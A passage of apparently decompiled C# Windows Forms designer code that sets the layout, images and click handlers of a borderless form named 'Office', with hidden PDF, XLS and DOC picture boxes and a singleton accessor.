		guna2PictureBox_6.MinimumSize = new Size(50, 50);
		guna2PictureBox_6.Name = "guna2PictureBox8";
		guna2PictureBox_6.Size = new Size(50, 50);
		guna2PictureBox_6.SizeMode = PictureBoxSizeMode.Zoom;
		guna2PictureBox_6.TabIndex = 17;
		guna2PictureBox_6.TabStop = false;
		guna2PictureBox_6.UseTransparentBackground = true;
		guna2PictureBox_6.Visible = false;
		guna2PictureBox_3.BackColor = Color.Transparent;
		guna2PictureBox_3.Image = (Image)resources.GetObject("picture_pdf.Image");
		guna2PictureBox_3.ImageRotate = 0f;
		guna2PictureBox_3.Location = new Point(580, 15);
		guna2PictureBox_3.MaximumSize = new Size(162, 239);
		guna2PictureBox_3.MinimumSize = new Size(162, 239);
		guna2PictureBox_3.Name = "picture_pdf";
		guna2PictureBox_3.Size = new Size(162, 239);
		guna2PictureBox_3.SizeMode = PictureBoxSizeMode.Zoom;
		guna2PictureBox_3.TabIndex = 12;
		guna2PictureBox_3.TabStop = false;
		guna2PictureBox_3.UseTransparentBackground = true;
		guna2PictureBox_3.Visible = false;
		guna2PictureBox_3.Click += guna2PictureBox_3_Click;
		guna2PictureBox_7.BackColor = Color.Transparent;
		guna2PictureBox_7.Image = (Image)resources.GetObject("guna2PictureBox7.Image");
		guna2PictureBox_7.ImageRotate = 0f;
		guna2PictureBox_7.Location = new Point(74, 431);
		guna2PictureBox_7.MaximumSize = new Size(50, 50);
		guna2PictureBox_7.MinimumSize = new Size(50, 50);
		guna2PictureBox_7.Name = "guna2PictureBox7";
		guna2PictureBox_7.Size = new Size(50, 50);
		guna2PictureBox_7.SizeMode = PictureBoxSizeMode.Zoom;
		guna2PictureBox_7.TabIndex = 16;
		guna2PictureBox_7.TabStop = false;
		guna2PictureBox_7.UseTransparentBackground = true;
		guna2PictureBox_7.Visible = false;
		guna2PictureBox_2.BackColor = Color.Transparent;
		guna2PictureBox_2.Image = (Image)resources.GetObject("picture_xls.Image");
		guna2PictureBox_2.ImageRotate = 0f;
		guna2PictureBox_2.Location = new Point(244, 15);
		guna2PictureBox_2.MaximumSize = new Size(162, 239);
		guna2PictureBox_2.MinimumSize = new Size(162, 239);
		guna2PictureBox_2.Name = "picture_xls";
		guna2PictureBox_2.Size = new Size(162, 239);
		guna2PictureBox_2.SizeMode = PictureBoxSizeMode.Zoom;
		guna2PictureBox_2.TabIndex = 7;
		guna2PictureBox_2.TabStop = false;
		guna2PictureBox_2.UseTransparentBackground = true;
		guna2PictureBox_2.Visible = false;
		guna2PictureBox_2.Click += guna2PictureBox_2_Click;
		guna2PictureBox_4.BackColor = Color.Transparent;
		guna2PictureBox_4.Image = (Image)resources.GetObject("guna2PictureBox6.Image");
		guna2PictureBox_4.ImageRotate = 0f;
		guna2PictureBox_4.Location = new Point(12, 431);
		guna2PictureBox_4.MaximumSize = new Size(50, 50);
		guna2PictureBox_4.MinimumSize = new Size(50, 50);
		guna2PictureBox_4.Name = "guna2PictureBox6";
		guna2PictureBox_4.Size = new Size(50, 50);
		guna2PictureBox_4.SizeMode = PictureBoxSizeMode.Zoom;
		guna2PictureBox_4.TabIndex = 15;
		guna2PictureBox_4.TabStop = false;
		guna2PictureBox_4.UseTransparentBackground = true;
		guna2PictureBox_4.Visible = false;
		guna2PictureBox_1.BackColor = Color.Transparent;
		guna2PictureBox_1.Image = (Image)resources.GetObject("picture_doc.Image");
		guna2PictureBox_1.ImageRotate = 0f;
		guna2PictureBox_1.Location = new Point(412, 15);
		guna2PictureBox_1.MaximumSize = new Size(162, 239);
		guna2PictureBox_1.MinimumSize = new Size(162, 239);
		guna2PictureBox_1.Name = "picture_doc";
		guna2PictureBox_1.Size = new Size(162, 239);
		guna2PictureBox_1.SizeMode = PictureBoxSizeMode.Zoom;
		guna2PictureBox_1.TabIndex = 3;
		guna2PictureBox_1.TabStop = false;
		guna2PictureBox_1.UseTransparentBackground = true;
		guna2PictureBox_1.Visible = false;
		guna2PictureBox_1.Click += guna2PictureBox_1_Click;
		guna2DragControl_0.DockIndicatorTransparencyValue = 0.6;
		guna2DragControl_0.TargetControl = guna2Panel_0;
		guna2DragControl_0.UseTransparentDrag = true;
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.White;
		base.ClientSize = new Size(998, 529);
		base.Controls.Add(guna2Panel_1);
		base.Controls.Add(guna2Panel_0);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Icon = (Icon)resources.GetObject("$this.Icon");
		MaximumSize = new Size(998, 529);
		MinimumSize = new Size(998, 529);
		base.Name = "Office";
		base.StartPosition = FormStartPosition.CenterScreen;
		Text = "S";
		base.Load += Office_Load;
		guna2Panel_0.ResumeLayout(performLayout: false);
		((ISupportInitialize)guna2PictureBox_0).EndInit();
		guna2Panel_1.ResumeLayout(performLayout: false);
		guna2Panel_1.PerformLayout();
		((ISupportInitialize)guna2PictureBox_9).EndInit();
		((ISupportInitialize)guna2PictureBox_8).EndInit();
		((ISupportInitialize)guna2PictureBox_5).EndInit();
		((ISupportInitialize)guna2PictureBox_6).EndInit();
		((ISupportInitialize)guna2PictureBox_3).EndInit();
		((ISupportInitialize)guna2PictureBox_7).EndInit();
		((ISupportInitialize)guna2PictureBox_2).EndInit();
		((ISupportInitialize)guna2PictureBox_4).EndInit();
		((ISupportInitialize)guna2PictureBox_1).EndInit();
		ResumeLayout(performLayout: false);
	}

	internal static bool smethod_0()
	{
		return office_0 == null;
	}

	internal static Office smethod_1()
	{
		return office_0;
	}
}
